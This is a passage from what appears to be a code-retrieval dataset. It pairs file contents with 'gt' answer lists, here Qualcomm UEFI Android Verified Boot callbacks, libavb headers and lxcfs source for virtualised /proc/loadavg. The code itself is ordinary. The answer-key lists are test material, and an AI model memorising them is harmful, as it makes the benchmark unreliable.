AvbReadRollbackIndex(AvbOps *Ops, size_t RollbackIndexLocation,\n                                 uint64_t *OutRollbackIndex)\n{\n\n\tEFI_STATUS Status = ReadRollbackIndex(RollbackIndexLocation, OutRollbackIndex);\n\n\tif (Status != EFI_SUCCESS) {\n\t\tDEBUG((EFI_D_ERROR, \"ReadRollbackIndex failed! %r\\n\", Status));\n\t\treturn AVB_IO_RESULT_ERROR_IO;\n\t}\n\tDEBUG((EFI_D_VERBOSE,\n\t       \"ReadRollbackIndex Location %d, RollbackIndex %d\\n\",\n\t       RollbackIndexLocation, *OutRollbackIndex));\n\treturn AVB_IO_RESULT_OK;\n}\n\nAvbIOResult\nAvbWriteRollbackIndex(AvbOps *Ops, size_t RollbackIndexLocation, uint64_t RollbackIndex)\n{\n\tEFI_STATUS Status = EFI_SUCCESS;\n\tBOOLEAN UpdateRollbackIndex = FALSE;\n\tAvbOpsUserData *UserData = NULL;\n\n\tUserData = (AvbOpsUserData *)Ops->user_data;\n\tDEBUG((EFI_D_VERBOSE,\n\t       \"WriteRollbackIndex Location %d, RollbackIndex %d\\n\",\n\t       RollbackIndexLocation, RollbackIndex));\n\n\tUpdateRollbackIndex = avb_should_update_rollback(UserData->IsMultiSlot);\n\tif (UpdateRollbackIndex == TRUE) {\n\t\tDEBUG((EFI_D_INFO,\n\t\t       \"Updating rollback index %d, for location %d\\n\",\n\t\t       RollbackIndex, RollbackIndexLocation));\n\t\tStatus = WriteRollbackIndex(RollbackIndexLocation, RollbackIndex);\n\t\tif (Status != EFI_SUCCESS) {\n\t\t\tDEBUG((EFI_D_ERROR, \"ReadRollbackIndex failed! %r\\n\", Status));\n\t\t\treturn AVB_IO_RESULT_ERROR_IO;\n\t\t}\n\t}\n\treturn AVB_IO_RESULT_OK;\n}\n\nAvbIOResult AvbReadIsDeviceUnlocked(AvbOps *Ops, bool *OutIsUnlocked)\n{\n\tif (OutIsUnlocked == NULL) {\n\t\tDEBUG((EFI_D_ERROR, \"bad input paramaters\\n\"));\n\t\treturn AVB_IO_RESULT_ERROR_IO;\n\t}\n\t*OutIsUnlocked = IsUnlocked();\n\treturn AVB_IO_RESULT_OK;\n}\n\nSTATIC VOID GuidToHex(CHAR8 *Buf, EFI_GUID *Guid)\n{\n\tCHAR8 HexDigits[17] = \"0123456789abcdef\";\n\n\tBuf[0] = HexDigits[(Guid->Data1 >> 28) & 0x0f];\n\tBuf[1] = HexDigits[(Guid->Data1 >> 24) & 0x0f];\n\tBuf[2] = HexDigits[(Guid->Data1 >> 20) & 0x0f];\n\tBuf[3] = HexDigits[(Guid->Data1 >> 16) & 0x0f];\n\tBuf[4] = HexDigits[(Guid->Data1 >> 12) & 0x0f];\n\tBuf[5] = HexDigits[(Guid->Data1 >> 8) & 0x0f];\n\tBuf[6] = HexDigits[(Guid->Data1 >> 4) & 0x0f];\n\tBuf[7] = HexDigits[(Guid->Data1 >> 0) & 0x0f];\n\tBuf[8] = '-';\n\tBuf[9] = HexDigits[(Guid->Data2 >> 12) & 0x0f];\n\tBuf[10] = HexDigits[(Guid->Data2 >> 8) & 0x0f];\n\tBuf[11] = HexDigits[(Guid->Data2 >> 4) & 0x0f];\n\tBuf[12] = HexDigits[(Guid->Data2 >> 0) & 0x0f];\n\tBuf[13] = '-';\n\tBuf[14] = HexDigits[(Guid->Data3 >> 12) & 0x0f];\n\tBuf[15] = HexDigits[(Guid->Data3 >> 8) & 0x0f];\n\tBuf[16] = HexDigits[(Guid->Data3 >> 4) & 0x0f];\n\tBuf[17] = HexDigits[(Guid->Data3 >> 0) & 0x0f];\n\tBuf[18] = '-';\n\tBuf[19] = HexDigits[(Guid->Data4[0] >> 4) & 0x0f];\n\tBuf[20] = HexDigits[(Guid->Data4[0] >> 0) & 0x0f];\n\tBuf[21] = HexDigits[(Guid->Data4[1] >> 4) & 0x0f];\n\tBuf[22] = HexDigits[(Guid->Data4[1] >> 0) & 0x0f];\n\tBuf[23] = '-';\n\tBuf[24] = HexDigits[(Guid->Data4[2] >> 4) & 0x0f];\n\tBuf[25] = HexDigits[(Guid->Data4[2] >> 0) & 0x0f];\n\tBuf[26] = HexDigits[(Guid->Data4[3] >> 4) & 0x0f];\n\tBuf[27] = HexDigits[(Guid->Data4[3] >> 0) & 0x0f];\n\tBuf[28] = HexDigits[(Guid->Data4[4] >> 4) & 0x0f];\n\tBuf[29] = HexDigits[(Guid->Data4[4] >> 0) & 0x0f];\n\tBuf[30] = HexDigits[(Guid->Data4[5] >> 4) & 0x0f];\n\tBuf[31] = HexDigits[(Guid->Data4[5] >> 0) & 0x0f];\n\tBuf[32] = HexDigits[(Guid->Data4[6] >> 4) & 0x0f];\n\tBuf[33] = HexDigits[(Guid->Data4[6] >> 0) & 0x0f];\n\tBuf[34] = HexDigits[(Guid->Data4[7] >> 4) & 0x0f];\n\tBuf[35] = HexDigits[(Guid->Data4[7] >> 0) & 0x0f];\n\tBuf[36] = '\\0';\n}\n\nAvbIOResult AvbGetUniqueGuidForPartition(AvbOps *Ops, const char *PartitionName,\n                                         char *GuidBuf, size_t GuidBufSize)\n{\n\tEFI_STATUS Status = EFI_SUCCESS;\n\tAvbIOResult Result = AVB_IO_RESULT_OK;\n\tHandleInfo HandleInfoList[1];\n\tEFI_PARTITION_ENTRY *PartEntry = NULL;\n\tCHAR16 UnicodePartition[MAX_GPT_NAME_SIZE] = {0};\n\n\tResult = GetHandleInfo(PartitionName, HandleInfoList);\n\tif (Result != AVB_IO_RESULT_OK) {\n\t\tDEBUG((EFI_D_ERROR,\n\t\t       \"AvbGetSizeOfPartition: GetHandleInfo failed\"));\n\t\treturn Result;\n\t}\n\n\tStatus = gBS->HandleProtocol(HandleInfoList[0].Handle,\n\t                             &gEfiPartitionRecordGuid, (VOID **)&PartEntry);\n\tif (EFI_ERROR(Status)) {\n\t\tDEBUG((EFI_D_INFO, \"No PartitionRecord!\\n\"));\n\t\treturn AVB_IO_RESULT_ERROR_IO;\n\t}\n\n\tif ((AsciiStrLen(PartitionName) + 1) > ARRAY_SIZE(UnicodePartition)) {\n\t\tDEBUG((EFI_D_ERROR, \"AvbGetUniqueGuidForPartition: Partition \"\n\t\t                    \"%a, name too large\\n\",\n\t\t       PartitionName));\n\t\treturn AVB_IO_RESULT_ERROR_IO;\n\t}\n\n\tAsciiStrToUnicodeStrS(PartitionName, UnicodePartition, MAX_GPT_NAME_SIZE);\n\n\tif (!(StrnCmp(UnicodePartition, PartEntry->PartitionName,\n\t              StrLen(UnicodePartition)))) {\n\t\tGuidToHex(GuidBuf, &PartEntry->UniquePartitionGUID);\n\t\tDEBUG((EFI_D_VERBOSE, \"%s uuid: %a\\n\", UnicodePartition, GuidBuf));\n\t\treturn AVB_IO_RESULT_OK;\n\t}\n\n\treturn AVB_IO_RESULT_ERROR_NO_SUCH_PARTITION;\n}\n\nAvbIOResult AvbGetSizeOfPartition(AvbOps *Ops, const char *Partition, uint64_t *OutSizeNumBytes)\n{\n\tAvbIOResult Result = AVB_IO_RESULT_OK;\n\tHandleInfo HandleInfoList[1];\n\tEFI_BLOCK_IO_PROTOCOL *BlockIo = NULL;\n\n\tif (Ops == NULL || Partition == NULL || OutSizeNumBytes == NULL) {\n\t\tDEBUG((EFI_D_ERROR,\n\t\t       \"AvbGetSizeOfPartition invalid parameter pointers\\n\"));\n\t\treturn AVB_IO_RESULT_ERROR_IO;\n\t}\n\n\tResult = GetHandleInfo(Partition, HandleInfoList);\n\tif (Result != AVB_IO_RESULT_OK) {\n\t\tDEBUG((EFI_D_ERROR,\n\t\t       \"AvbGetSizeOfPartition: GetHandleInfo failed\"));\n\t\treturn Result;\n\t}\n\n\tBlockIo = HandleInfoList[0].BlkIo;\n    *OutSizeNumBytes = GetPartitionSize (BlockIo);\n    if (*OutSizeNumBytes == 0) {\n      return AVB_IO_RESULT_ERROR_RANGE_OUTSIDE_PARTITION;\n    }\n\n\treturn AVB_IO_RESULT_OK;\n}\n\nAvbOps *AvbOpsNew(VOID *UserData)\n{\n\tAvbOps *Ops = avb_calloc(sizeof(AvbOps));\n\n\tif (Ops == NULL) {\n\t\tDEBUG((EFI_D_ERROR, \"Error allocating memory for AvbOps.\\n\"));\n\t\tgoto out;\n\t}\n\n\tOps->user_data = UserData;\n\tOps->read_from_partition = AvbReadFromPartition;\n\tOps->write_to_partition = AvbWriteToPartition;\n\tOps->validate_vbmeta_public_key = AvbValidateVbmetaPublicKey;\n\tOps->validate_public_key_for_partition = AvbValidatePartitionPublicKey;\n\tOps->read_rollback_index = AvbReadRollbackIndex;\n\tOps->write_rollback_index = AvbWriteRollbackIndex;\n\tOps->read_is_device_unlocked = AvbReadIsDeviceUnlocked;\n\tOps->get_unique_guid_for_partition = AvbGetUniqueGuidForPartition;\n\tOps->get_size_of_partition = AvbGetSizeOfPartition;\n\nout:\n\treturn Ops;\n}\n\nVOID AvbOpsFree(AvbOps *Ops)\n{\n\tif (Ops != NULL) {\n\t\tavb_free(Ops);\n\t}\n}\n\n'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/avb/libavb/avb_version.h'\n:\n\n#if !defined(AVB_INSIDE_LIBAVB_H) && !defined(AVB_COMPILATION)\n#error \"Never include this file directly, include libavb.h instead.\"\n#endif\n\n#ifndef AVB_VERSION_H_\n#define AVB_VERSION_H_\n\n#include \"avb_sysdeps.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n#define AVB_VERSION_MAJOR 1\n#define AVB_VERSION_MINOR 0\n#define AVB_VERSION_SUB 0\n\n\nconst char* avb_version_string(void);\n\n\n#define AVB_MAJOR_VERSION AVB_VERSION_MAJOR\n#define AVB_MINOR_VERSION AVB_VERSION_MINOR\n\n#ifdef __cplusplus\n}\n#endif\n\n#endif\n\n'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/avb/libavb/libavb.h'\n:\n\n#ifndef LIBAVB_H_\n#define LIBAVB_H_\n\n\n\n#define AVB_INSIDE_LIBAVB_H\n#include \"avb_chain_partition_descriptor.h\"\n#include \"avb_crypto.h\"\n#include \"avb_descriptor.h\"\n#include \"avb_footer.h\"\n#include \"avb_hash_descriptor.h\"\n#include \"avb_hashtree_descriptor.h\"\n#include \"avb_kernel_cmdline_descriptor.h\"\n#include \"avb_ops.h\"\n#include \"avb_property_descriptor.h\"\n#include \"avb_sha.h\"\n#include \"avb_slot_verify.h\"\n#include \"avb_sysdeps.h\"\n#include \"avb_util.h\"\n#include \"avb_vbmeta_image.h\"\n#include \"avb_version.h\"\n#undef AVB_INSIDE_LIBAVB_H\n\n#endif\n",
        "gt": [
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/avb/libavb/avb_version.h'",
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/avb/libavb/libavb.h'",
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/avb/libavb/avb_ops.c'"
        ]
    },
    {
        "files": [
            "'lxcfs/src/bindings.h'",
            "'lxcfs/src/macro.h'",
            "'lxcfs/src/proc_loadavg.c'",
            "'lxcfs/src/proc_fuse.h'"
        ],
        "content": "'lxcfs/src/bindings.h'\n:\n\n#ifndef __LXCFS_BINDINGS_H\n#define __LXCFS_BINDINGS_H\n\n#include \"config.h\"\n\n#include <linux/limits.h>\n#include <linux/types.h>\n#include <signal.h>\n#include <stdbool.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <sys/stat.h>\n#include <sys/types.h>\n#include <unistd.h>\n\n#include \"lxcfs_fuse.h\"\n\n#include \"cgroup_fuse.h\"\n#include \"macro.h\"\n#include \"proc_cpuview.h\"\n#include \"proc_fuse.h\"\n#include \"proc_loadavg.h\"\n#include \"sysfs_fuse.h\"\n\n\n#define LXCFS_NUMSTRLEN64 21\n\n\nenum lxcfs_virt_t {\n\tLXC_TYPE_CGDIR,\n\tLXC_TYPE_CGFILE,\n\n\tLXC_TYPE_PROC_MEMINFO,\n#define LXC_TYPE_PROC_MEMINFO_PATH \"/proc/meminfo\"\n\n\tLXC_TYPE_PROC_CPUINFO,\n#define LXC_TYPE_PROC_CPUINFO_PATH \"/proc/cpuinfo\"\n\n\tLXC_TYPE_PROC_UPTIME,\n#define LXC_TYPE_PROC_UPTIME_PATH \"/proc/uptime\"\n\n\tLXC_TYPE_PROC_STAT,\n#define LXC_TYPE_PROC_STAT_PATH \"/proc/stat\"\n\n\tLXC_TYPE_PROC_DISKSTATS,\n#define LXC_TYPE_PROC_DISKSTATS_PATH \"/proc/diskstats\"\n\n\tLXC_TYPE_PROC_SWAPS,\n#define LXC_TYPE_PROC_SWAPS_PATH \"/proc/swaps\"\n\n\tLXC_TYPE_PROC_LOADAVG,\n#define LXC_TYPE_PROC_LOADAVG_PATH \"/proc/loadavg\"\n\n\tLXC_TYPE_PROC_SLABINFO,\n#define LXC_TYPE_PROC_SLABINFO_PATH \"/proc/slabinfo\"\n\n\tLXC_TYPE_SYS,\n\tLXC_TYPE_SYS_DEVICES,\n\tLXC_TYPE_SYS_DEVICES_SYSTEM,\n\tLXC_TYPE_SYS_DEVICES_SYSTEM_CPU,\n\tLXC_TYPE_SYS_DEVICES_SYSTEM_CPU_SUBDIR,\n\tLXC_TYPE_SYS_DEVICES_SYSTEM_CPU_SUBFILE,\n\n\tLXC_TYPE_SYS_DEVICES_SYSTEM_CPU_ONLINE,\n#define LXC_TYPE_SYS_DEVICES_SYSTEM_CPU_ONLINE_PATH \"/sys/devices/system/cpu/online\"\n\tLXC_TYPE_MAX,\n};\n\n\n#define LXCFS_TYPE_CGROUP(type) (type >= LXC_TYPE_CGDIR && type <= LXC_TYPE_CGFILE)\n#define LXCFS_TYPE_PROC(type) (type >= LXC_TYPE_PROC_MEMINFO && type <= LXC_TYPE_PROC_SLABINFO)\n#define LXCFS_TYPE_SYS(type) (type >= LXC_TYPE_SYS && type <= LXC_TYPE_SYS_DEVICES_SYSTEM_CPU_ONLINE)\n#define LXCFS_TYPE_OK(type) (type >= LXC_TYPE_CGDIR && type < LXC_TYPE_MAX)\n\n\n#define LXCFS_INTR_SIGNAL SIGTTOU\n\nextern int mutex_lock_interruptible(pthread_mutex_t *l);\nextern int rwlock_rdlock_interruptible(pthread_rwlock_t *l);\nextern int rwlock_wrlock_interruptible(pthread_rwlock_t *l);\n\nstruct file_info {\n\tchar *controller;\n\tchar *cgroup;\n\tchar *file;\n\tint type;\n\tchar *buf;\n\tint buflen;\n\tint size;\n\tint cached;\n};\n\nstruct lxcfs_opts {\n\tbool swap_off;\n\tbool use_pidfd;\n\tbool use_cfs;\n\n\t__u32 version;\n\n        char runtime_path[PATH_MAX];\n};\n\ntypedef enum lxcfs_opt_t {\n\tLXCFS_SWAP_ON\t= 0,\n\tLXCFS_PIDFD_ON\t= 1,\n\tLXCFS_CFS_ON\t= 2,\n\tLXCFS_OPTS_MAX\t= LXCFS_CFS_ON,\n} lxcfs_opt_t;\n\n\nextern pid_t lookup_initpid_in_store(pid_t qpid);\nextern void prune_init_slice(char *cg);\nextern bool supports_pidfd(void);\nextern bool liblxcfs_functional(void);\nextern bool liblxcfs_can_use_swap(void);\nextern bool liblxcfs_memory_is_cgroupv2(void);\nextern bool liblxcfs_can_use_sys_cpu(void);\nextern bool liblxcfs_has_versioned_opts(void);\nextern __u32 liblxcfs_personality(void);\n\nstatic inline bool lxcfs_has_opt(struct lxcfs_opts *opts, lxcfs_opt_t opt)\n{\n\tif (!opts)\n\t\treturn false;\n\n\tif (opt > LXCFS_OPTS_MAX)\n\t\treturn false;\n\n\tswitch (opt) {\n\tcase LXCFS_SWAP_ON:\n\t\tif (!opts->swap_off)\n\t\t\treturn liblxcfs_can_use_swap();\n\t\treturn false;\n\tcase LXCFS_PIDFD_ON:\n\t\treturn opts->use_pidfd;\n\tcase LXCFS_CFS_ON:\n\t\treturn opts->use_cfs;\n\t}\n\n\treturn false;\n}\n\nstatic inline int install_signal_handler(int signo,\n\t\t\t\t\t void (*handler)(int, siginfo_t *, void *))\n{\n\tstruct sigaction action = {\n\t    .sa_flags = SA_SIGINFO,\n\t    .sa_sigaction = handler,\n\t};\n\n\treturn sigaction(signo, &action, NULL);\n}\n\nextern pid_t lxcfs_raw_clone(unsigned long flags, int *pidfd);\n\nstatic inline pid_t lxcfs_clone(int (*fn)(void *), void *arg, int flags)\n{\n\tpid_t pid;\n\n\tpid = lxcfs_raw_clone(flags, NULL);\n\tif (pid < 0)\n\t\treturn -1;\n\n\tif (pid == 0)\n\t\t_exit(fn(arg));\n\n\treturn pid;\n}\n\n__visible extern void *lxcfs_fuse_init(struct fuse_conn_info *conn, void *data);\n\n#endif\n\n'lxcfs/src/macro.h'\n:\n\n#ifndef __LXCFS_MACRO_H\n#define __LXCFS_MACRO_H\n\n#include \"config.h\"\n\n#include <stdbool.h>\n#include <stdio.h>\n#include <linux/types.h>\n\n#define BATCH_SIZE 50\n\n\n#ifndef CGROUP_SUPER_MAGIC\n#define CGROUP_SUPER_MAGIC 0x27e0eb\n#endif\n\n#ifndef CGROUP2_SUPER_MAGIC\n#define CGROUP2_SUPER_MAGIC 0x63677270\n#endif\n\n#define lxcfs_debug_stream(stream, format, ...)                       \\\n\tdo {                                                          \\\n\t\tfprintf(stream, \"%s: %d: %s: \" format \"\\n\", __FILE__, \\\n\t\t\t__LINE__, __func__, ##__VA_ARGS__);           \\\n\t} while (false)\n\n#define lxcfs_error(format, ...) lxcfs_debug_stream(stderr, format, ##__VA_ARGS__)\n\n#ifdef DEBUG\n#define lxcfs_debug(format, ...) lxcfs_error(format, ##__VA_ARGS__)\n#else\n#define lxcfs_debug(format, ...) \\\n\tdo {                     \\\n\t} while (false)\n#endif\n\n#ifdef VERBOSE\n#define lxcfs_v(format, ...) lxcfs_error(format, ##__VA_ARGS__);\n#else\n#define lxcfs_v(format, ...)\n#endif\n\n#define lxcfs_info(format, ...)                              \\\n\tdo {                                                 \\\n\t\tfprintf(stderr, format \"\\n\", ##__VA_ARGS__); \\\n\t} while (false)\n\n#define log_error_errno(__ret__, __errno__, format, ...) \\\n\t({\t\t\t\t\t\t \\\n\t\terrno = __errno__;\t\t\t \\\n\t\tlxcfs_error(format, ##__VA_ARGS__);\t \\\n\t\t__ret__;\t\t\t\t \\\n\t})\n\n#define log_error(__ret__, format, ...)             \\\n\t({                                          \\\n\t\tlxcfs_error(format, ##__VA_ARGS__); \\\n\t\t__ret__;                            \\\n\t})\n\n#define STRLITERALLEN(x) (sizeof(\"\"x\"\") - 1)\n\n\n#define INTTYPE_TO_STRLEN(type)                   \\\n\t(2 + (sizeof(type) <= 1                   \\\n\t\t  ? 3                             \\\n\t\t  : sizeof(type) <= 2             \\\n\t\t\t? 5                       \\\n\t\t\t: sizeof(type) <= 4       \\\n\t\t\t      ? 10                \\\n\t\t\t      : sizeof(type) <= 8 \\\n\t\t\t\t    ? 20          \\\n\t\t\t\t    : sizeof(int[-2 * (sizeof(type) > 8)])))\n\n#define strnprintf(buf, buf_size, ...)                                                    \\\n\t({                                                                                \\\n\t\tint __ret_strnprintf;                                                     \\\n\t\t__ret_strnprintf = snprintf(buf, buf_size, ##__VA_ARGS__);                \\\n\t\tif (__ret_strnprintf < 0 || (size_t)__ret_strnprintf >= (size_t)buf_size) \\\n\t\t\t__ret_strnprintf = ret_errno(EIO);\t\t\t\t  \\\n\t\t__ret_strnprintf;                                                         \\\n\t})\n\n#define move_ptr(ptr)                                 \\\n\t({                                            \\\n\t\t__typeof__(ptr) __internal_ptr__ = (ptr); \\\n\t\t(ptr) = NULL;                         \\\n\t\t__internal_ptr__;                     \\\n\t})\n\n#define move_fd(fd)                         \\\n\t({                                  \\\n\t\tint __internal_fd__ = (fd); \\\n\t\t(fd) = -EBADF;              \\\n\t\t__internal_fd__;            \\\n\t})\n\n#define ret_errno(__errno__)       \\\n\t({                         \\\n\t\terrno = __errno__; \\\n\t\t-__errno__;        \\\n\t})\n\n#define ret_set_errno(__ret__, __errno__) \\\n\t({                                \\\n\t\terrno = __errno__;        \\\n\t\t__ret__;                  \\\n\t})\n\n#define lxc_iterate_parts(__iterator, __splitme, __separators)                  \\\n\tfor (char *__p = NULL, *__it = strtok_r(__splitme, __separators, &__p); \\\n\t     (__iterator = __it);                                               \\\n\t     __iterator = __it = strtok_r(NULL, __separators, &__p))\n\n#define log_exit(format, ...)                           \\\n\t({                                              \\\n\t\tfprintf(stderr, format, ##__VA_ARGS__); \\\n\t\t_exit(EXIT_FAILURE);                    \\\n\t})\n\n#ifdef DEBUG\n#define log_debug(__ret__, format, ...)                            \\\n\t({                                                         \\\n\t\tlxcfs_debug_stream(stderr, format, ##__VA_ARGS__); \\\n\t\t__ret__;                                           \\\n\t})\n#else\n#define log_debug(__ret__, format, ...) ({ __ret__; })\n#endif\n\n#define PTR_TO_INT(p) ((int)((intptr_t)(p)))\n#define INT_TO_PTR(u) ((void *)((intptr_t)(u)))\n#define PTR_TO_UINT64(p) ((uint64_t)((uintptr_t)(p)))\n#define INTTYPE_TO_PTR(u) ((void *)((uintptr_t)(u)))\n\n#define __visible __attribute__((visibility(\"default\")))\n\n#define __lxcfs_fuse_ops\n\n#ifndef __returns_twice\n#define __returns_twice __attribute__((returns_twice))\n#endif\n\n#define STRINGIFY(a) __STRINGIFY(a)\n#define __STRINGIFY(a) #a\n\n\n#define NBITS 32\n#define DIV_ROUND_UP(n, d) (((n) + (d)-1) / (d))\n#define BITS_TO_LONGS(nr) DIV_ROUND_UP(nr, NBITS)\n\nstatic inline void set_bit(__u32 bit, __u32 *bitarr)\n{\n\tbitarr[bit / NBITS] |= ((__u32)1 << (bit % NBITS));\n}\n\nstatic inline void clear_bit(__u32 bit, __u32 *bitarr)\n{\n\tbitarr[bit / NBITS] &= ~((__u32)1 << (bit % NBITS));\n}\n\nstatic inline bool is_set(__u32 bit, __u32 *bitarr)\n{\n\treturn (bitarr[bit / NBITS] & ((__u32)1 << (bit % NBITS))) != 0;\n}\n\n#endif\n\n'lxcfs/src/proc_loadavg.c'\n:\n\n#include \"config.h\"\n\n#include <dirent.h>\n#include <errno.h>\n#include <fcntl.h>\n#include <inttypes.h>\n#include <libgen.h>\n#include <pthread.h>\n#include <sched.h>\n#include <stdarg.h>\n#include <stdbool.h>\n#include <stdint.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <time.h>\n#include <unistd.h>\n#include <wait.h>\n#include <linux/magic.h>\n#include <linux/sched.h>\n#include <sys/epoll.h>\n#include <sys/mman.h>\n#include <sys/mount.h>\n#include <sys/param.h>\n#include <sys/socket.h>\n#include <sys/syscall.h>\n#include <sys/sysinfo.h>\n#include <sys/vfs.h>\n\n#include \"proc_loadavg.h\"\n\n#include \"bindings.h\"\n#include \"cgroup_fuse.h\"\n#include \"cgroups/cgroup.h\"\n#include \"cgroups/cgroup_utils.h\"\n#include \"memory_utils.h\"\n#include \"utils.h\"\n\n\nstatic int loadavg = 0;\n\n\n#define LOAD_SIZE 100\n#define FLUSH_TIME 5\n#define DEPTH_DIR 3\n\n#define FSHIFT\t\t(uint64_t)11\n#define FIXED_1\t\t((uint64_t)1 << FSHIFT)\n#define EXP_1\t\t(uint64_t)1884\n#define EXP_5\t\t(uint64_t)2014\n#define EXP_15\t\t(uint64_t)2037\n#define LOAD_INT(x) ((x) >> FSHIFT)\n#define LOAD_FRAC(x) LOAD_INT(((x) & (FIXED_1 - 1)) * (uint64_t)100)\nstatic volatile sig_atomic_t loadavg_stop = 0;\n\nstruct load_node {\n\n\tchar *cg;\n\n\tuint64_t avenrun[3];\n\tunsigned int run_pid;\n\tunsigned int total_pid;\n\tunsigned int last_pid;\n\n\tint cfd;\n\tstruct load_node *next;\n\tstruct load_node **pre;\n};\n\nstruct load_head {\n\n\n\n\tpthread_mutex_t lock;\n\n\tpthread_rwlock_t rdlock;\n\n\tpthread_rwlock_t rilock;\n\tstruct load_node *next;\n};\n\nstatic struct load_head load_hash[LOAD_SIZE];\n\n\nstatic struct load_node *locate_node(char *cg, int locate)\n{\n\tstruct load_node *f = NULL;\n\tint i = 0;\n\n\tpthread_rwlock_rdlock(&load_hash[locate].rdlock);\n\tpthread_rwlock_rdlock(&load_hash[locate].rilock);\n\tif (load_hash[locate].next == NULL) {\n\t\tpthread_rwlock_unlock(&load_hash[locate].rilock);\n\t\treturn f;\n\t}\n\tf = load_hash[locate].next;\n\tpthread_rwlock_unlock(&load_hash[locate].rilock);\n\twhile (f && ((i = strcmp(f->cg, cg)) != 0))\n\t\tf = f->next;\n\treturn f;\n}\n\n\nstatic void insert_node(struct load_node **n, int locate)\n{\n\tstruct load_node *f;\n\n\tpthread_mutex_lock(&load_hash[locate].lock);\n\n\n\tf = locate_node((*n)->cg, locate);\n\tif (f) {\n\t\tfree_disarm((*n)->cg);\n\t\tfree_disarm((*n));\n\t\t*n = f;\n\n\t\tpthread_mutex_unlock(&load_hash[locate].lock);\n\t\treturn;\n\t}\n\n\n\n\tpthread_rwlock_wrlock(&load_hash[locate].rilock);\n\tf = load_hash[locate].next;\n\tload_hash[locate].next = *n;\n\n\t(*n)->pre = &(load_hash[locate].next);\n\tif (f)\n\t\tf->pre = &((*n)->next);\n\t(*n)->next = f;\n\tpthread_mutex_unlock(&load_hash[locate].lock);\n\tpthread_rwlock_unlock(&load_hash[locate].rilock);\n}\n\nint calc_hash(const char *name)\n{\n\tunsigned int hash = 0;\n\tunsigned int x = 0;\n\n\n\twhile (*name) {\n\t\thash = (hash << 4) + *name++;\n\t\tx = hash & 0xf0000000;\n\t\tif (x != 0)\n\t\t\thash ^= (x >> 24);\n\t\thash &= ~x;\n\t}\n\n\treturn (hash & 0x7fffffff);\n}\n\nint proc_loadavg_read(char *buf, size_t size, off_t offset,\n\t\t      struct fuse_file_info *fi)\n{\n\t__do_free char *cg = NULL;\n\tstruct fuse_context *fc = fuse_get_context();\n\tstruct file_info *d = INTTYPE_TO_PTR(fi->fh);\n\tpid_t initpid;\n\tssize_t total_len = 0;\n\tstruct load_node *n;\n\tint hash;\n\tint cfd;\n\tuint64_t a, b, c;\n\n\tif (offset) {\n\t\tsize_t left;\n\n\t\tif (offset > d->size)\n\t\t\treturn -EINVAL;\n\n\t\tif (!d->cached)\n\t\t\treturn 0;\n\n\t\tleft = d->size - offset;\n\t\ttotal_len = left > size ? size : left;\n\t\tmemcpy(buf, d->buf + offset, total_len);\n\n\t\treturn total_len;\n\t}\n\tif (!loadavg)\n\t\treturn read_file_fuse(\"/proc/loadavg\", buf, size, d);\n\n\tinitpid = lookup_initpid_in_store(fc->pid);\n\tif (initpid <= 1 || is_shared_pidns(initpid))\n\t\tinitpid = fc->pid;\n\n\tcg = get_pid_cgroup(initpid, \"cpu\");\n\tif (!cg)\n\t\treturn read_file_fuse(\"/proc/loadavg\", buf, size, d);\n\n\tprune_init_slice(cg);\n\thash = calc_hash(cg) % LOAD_SIZE;\n\tn = locate_node(cg, hash);\n\n\n\tif (n == NULL) {\n\t\tcfd = get_cgroup_fd(\"cpu\");\n\t\tif (cfd < 0) {\n\n\t\t\tpthread_rwlock_unlock(&load_hash[hash].rdlock);\n\t\t\treturn read_file_fuse(\"/proc/loadavg\", buf, size, d);\n\t\t}\n\n\t\tn = must_realloc(NULL, sizeof(struct load_node));\n\t\tn->cg = move_ptr(cg);\n\t\tn->avenrun[0] = 0;\n\t\tn->avenrun[1] = 0;\n\t\tn->avenrun[2] = 0;\n\t\tn->run_pid = 0;\n\t\tn->total_pid = 1;\n\t\tn->last_pid = initpid;\n\t\tn->cfd = cfd;\n\t\tpthread_rwlock_unlock(&load_hash[hash].rdlock);\n\t\tinsert_node(&n, hash);\n\n\t}\n\ta = n->avenrun[0] + (FIXED_1 / 200);\n\tb = n->avenrun[1] + (FIXED_1 / 200);\n\tc = n->avenrun[2] + (FIXED_1 / 200);\n\ttotal_len = snprintf(d->buf, d->buflen,\n\t\t\t     \"%\" PRIu64 \".%02\" PRIu64 \" \"\n\t\t\t     \"%\" PRIu64 \".%02lu \"\n\t\t\t     \"%\" PRIu64 \".%02\" PRIu64 \" \"\n\t\t\t     \"%d/\"\n\t\t\t     \"%d \"\n\t\t\t     \"%d\\n\",\n\t\t\t     LOAD_INT(a),\n\t\t\t     LOAD_FRAC(a),\n\t\t\t     LOAD_INT(b),\n\t\t\t     LOAD_FRAC(b),\n\t\t\t     LOAD_INT(c),\n\t\t\t     LOAD_FRAC(c),\n\t\t\t     n->run_pid,\n\t\t\t     n->total_pid,\n\t\t\t     n->last_pid);\n\tpthread_rwlock_unlock(&load_hash[hash].rdlock);\n\tif (total_len < 0 || total_len >= d->buflen)\n\t\treturn log_error(0, \"Failed to write to cache\");\n\n\td->size = (int)total_len;\n\td->cached = 1;\n\n\tif ((size_t)total_len > size)\n\t\ttotal_len = size;\n\n\tmemcpy(buf, d->buf, total_len);\n\treturn total_len;\n}\n\n\nstatic int calc_pid(char ***pid_buf, const char *rel_path, int depth, int sum, int cfd)\n{\n\t__do_free char *line = NULL, *path = NULL;\n\t__do_free void *fdopen_cache = NULL;\n\t__do_close int fd = -EBADF;\n\t__do_fclose FILE *f = NULL;\n\t__do_closedir DIR *dir = NULL;\n\tstruct dirent *file;\n\tsize_t linelen = 0;\n\tint pd;\n\n\tfd = openat(cfd, rel_path, O_RDONLY | O_CLOEXEC);\n\tif (fd < 0)\n\t\treturn sum;\n\n\tdir = fdopendir(fd);\n\tif (!dir)\n\t\treturn sum;\n\n\tmove_fd(fd);\n\n\twhile (((file = readdir(dir)) != NULL) && depth > 0) {\n\t\tif (strcmp(file->d_name, \".\") == 0)\n\t\t\tcontinue;\n\n\t\tif (strcmp(file->d_name, \"..\") == 0)\n\t\t\tcontinue;\n\n\t\tif (file->d_type == DT_DIR) {\n\t\t\t__do_free char *path_next = NULL;\n\t\t\tpath_next = 